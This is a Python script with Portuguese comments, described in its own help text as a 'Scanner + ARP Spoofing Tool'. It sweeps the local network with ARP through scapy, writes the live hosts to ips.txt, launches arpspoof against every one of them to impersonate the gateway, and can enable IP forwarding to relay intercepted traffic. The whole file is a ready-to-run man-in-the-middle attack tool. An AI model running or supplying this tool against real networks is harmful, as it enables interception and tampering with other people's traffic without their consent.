
import os
import sys
import subprocess
import socket
import psutil
import ipaddress
import argparse
from scapy.all import ARP, Ether, srp


# Verifica se está rodando como root
if os.geteuid() != 0:
    print("Execute como root.")
    sys.exit(1)


# Pega gateway e interface padrão
def get_default_gateway():
    result = subprocess.run(["ip", "route"], capture_output=True, text=True)

    for line in result.stdout.splitlines():
        if line.startswith("default"):
            parts = line.split()
            gateway = parts[2]
            interface = parts[4]
            return gateway, interface

    return None, None


# Obtém informações da LAN
def get_lan_info():
    gateway, interface = get_default_gateway()

    if not gateway or not interface:
        return None

    interfaces = psutil.net_if_addrs()

    for addr in interfaces[interface]:
        if addr.family == socket.AF_INET:
            return {
                "interface": interface,
                "ip": addr.address,
                "netmask": addr.netmask,
                "gateway": gateway
            }

    return None


# Escaneia hosts ativos via ARP
import ipaddress
import socket
import netifaces
from scapy.all import ARP, Ether, srp

def scan_hosts(interface, ip, netmask):
    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)

    print(f"\nEscaneando rede: {network}\n")

    arp = ARP(pdst=str(network))
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=2, iface=interface, verbose=False)[0]

    hosts_up = []

    for sent, received in result:
        hosts_up.append(received.psrc)

    return hosts_up


# Remove gateway e IP local
def filter_hosts(hosts, interface):
    # IP da máquina
    my_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

    # Gateway padrão
    gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]

    print(f"Removendo IP local: {my_ip}")
    print(f"Removendo Gateway: {gateway}")

    # Remove se estiver na lista
    filtered_hosts = [ip for ip in hosts if ip != my_ip and ip != gateway]

    return filtered_hosts


# Salva IPs no arquivo
def save_hosts_to_file(hosts, filename="ips.txt"):
    with open(filename, "w") as file:
        for ip in hosts:
            file.write(ip + "\n")

    print(f"\nIPs salvos em {filename}")


def arp_spoofing(lan_info, file_path ):
    processes = []

    with open(file_path, 'r') as file:
        ips = file.read().splitlines()

    for ip in ips:
        proc = subprocess.Popen([
            "arpspoof",
            "-i", lan_info["interface"],
            "-t", ip,
            lan_info["gateway"]
        ])
        processes.append(proc)

    print(f"{len(processes)} ataques iniciados...")

    try:
        # Mantém o script rodando
        for proc in processes:
            proc.wait()

    except KeyboardInterrupt:
        print("\nEncerrando ataques...")

        for proc in processes:
            proc.terminate()

        print("Finalizado.")

def set_ip_forwarding(enable: bool):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1" if enable else "0")

        if enable:
            print("[+] IP Forwarding habilitado.")
        else:
            print("[-] IP Forwarding desabilitado.")

    except Exception as e:
        print("Erro ao configurar IP Forwarding:", e)
        sys.exit(1)


# MAIN
def main():
    parser = argparse.ArgumentParser(
        description="Scanner + ARP Spoofing Tool"
    )

    parser.add_argument(
        "--forward",
        action="store_true",
        help="Habilita IP Forwarding"
    )

    parser.add_argument(
        "--no-forward",
        action="store_true",
        help="Desabilita IP Forwarding"
    )

    args = parser.parse_args()

    # Configuração do IP forwarding
    if args.forward and args.no_forward:
        print("Escolha apenas uma opção: --forward OU --no-forward")
        sys.exit(1)

    if args.forward:
        set_ip_forwarding(True)

    elif args.no_forward:
        set_ip_forwarding(False)

    lan_info = get_lan_info()

    if not lan_info:
        print("Não foi possível identificar a LAN.")
        return

    print("Interface:", lan_info["interface"])
    print("IP Local:", lan_info["ip"])
    print("Gateway:", lan_info["gateway"])

    hosts = scan_hosts(
        lan_info["interface"],
        lan_info["ip"],
        lan_info["netmask"]
    )

    # Remove seu próprio IP
    hosts = [ip for ip in hosts if ip != lan_info["ip"]]

    print("\nHosts ativos encontrados:")
    for ip in hosts:
        print(ip)

    save_hosts_to_file(hosts)

    print("Starting SPOOF")
    arp_spoofing(lan_info, file_path="ips.txt")


if __name__ == "__main__":
    main()